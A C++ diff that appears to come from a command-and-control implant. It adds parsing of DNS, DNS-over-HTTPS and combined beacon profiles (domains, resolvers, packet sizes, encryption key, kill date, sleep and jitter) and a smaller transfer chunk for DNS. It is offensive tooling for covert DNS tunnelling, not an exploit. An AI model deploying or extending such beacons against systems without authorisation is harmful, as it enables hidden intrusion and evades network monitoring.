@@ -74,9 +74,68 @@ AgentConfig::AgentConfig()
 	this->sleep_delay     = 0;
 	this->jitter_delay    = 0;
 
+#elif defined(BEACON_DNS)
+	this->profile.domain      = packer->UnpackBytesCopy(&length);
+	this->profile.resolvers   = packer->UnpackBytesCopy(&length);
+	this->profile.qtype       = packer->UnpackBytesCopy(&length);
+	this->profile.pkt_size    = packer->Unpack32();
+	this->profile.label_size  = packer->Unpack32();
+	this->profile.ttl         = packer->Unpack32();
+	this->profile.encrypt_key = this->encrypt_key;
+	this->listener_type       = packer->Unpack32();
+	this->kill_date           = packer->Unpack32();
+	this->working_time        = packer->Unpack32();
+	this->sleep_delay         = packer->Unpack32();
+	this->jitter_delay        = packer->Unpack32();
+
+#elif defined(BEACON_DOH)
+	this->profile.domain      = packer->UnpackBytesCopy(&length);
+	this->profile.urls        = packer->UnpackBytesCopy(&length);
+	this->profile.user_agent  = packer->UnpackBytesCopy(&length);
+	this->profile.pkt_size    = packer->Unpack32();
+	this->profile.label_size  = packer->Unpack32();
+	this->profile.ttl         = packer->Unpack32();
+	this->profile.encrypt_key = this->encrypt_key;
+	this->listener_type       = packer->Unpack32();
+	this->kill_date           = packer->Unpack32();
+	this->working_time        = packer->Unpack32();
+	this->sleep_delay         = packer->Unpack32();
+	this->jitter_delay        = packer->Unpack32();
+
+#elif defined(BEACON_DNS_DOH)
+	this->profile.dns.domain      = packer->UnpackBytesCopy(&length);
+	this->profile.dns.resolvers   = packer->UnpackBytesCopy(&length);
+	this->profile.dns.qtype       = packer->UnpackBytesCopy(&length);
+	this->profile.dns.pkt_size    = packer->Unpack32();
+	this->profile.dns.label_size  = packer->Unpack32();
+	this->profile.dns.ttl         = packer->Unpack32();
+	this->profile.dns.encrypt_key = this->encrypt_key;
+
+	this->profile.doh.domain      = packer->UnpackBytesCopy(&length);
+	this->profile.doh.urls        = packer->UnpackBytesCopy(&length);
+	this->profile.doh.user_agent  = packer->UnpackBytesCopy(&length);
+	this->profile.doh.pkt_size    = packer->Unpack32();
+	this->profile.doh.label_size  = packer->Unpack32();
+	this->profile.doh.ttl         = packer->Unpack32();
+	this->profile.doh.encrypt_key = this->encrypt_key;
+	this->profile.doh.doh_mode    = packer->UnpackBytesCopy(&length);
+
+	this->profile.mode            = packer->UnpackBytesCopy(&length);
+	this->profile.doh_mode        = packer->UnpackBytesCopy(&length);
+
+	this->listener_type           = packer->Unpack32();
+	this->kill_date               = packer->Unpack32();
+	this->working_time            = packer->Unpack32();
+	this->sleep_delay             = packer->Unpack32();
+	this->jitter_delay            = packer->Unpack32();
+
 #endif
 
+#if defined(BEACON_DNS) || defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
+	this->download_chunk_size = 0x8000; // 32 KB for DNS
+#else
 	this->download_chunk_size = 0x19000;
+#endif
 
 	delete packer;
 	MemFreeLocal((LPVOID*)&ProfileBytes, size);
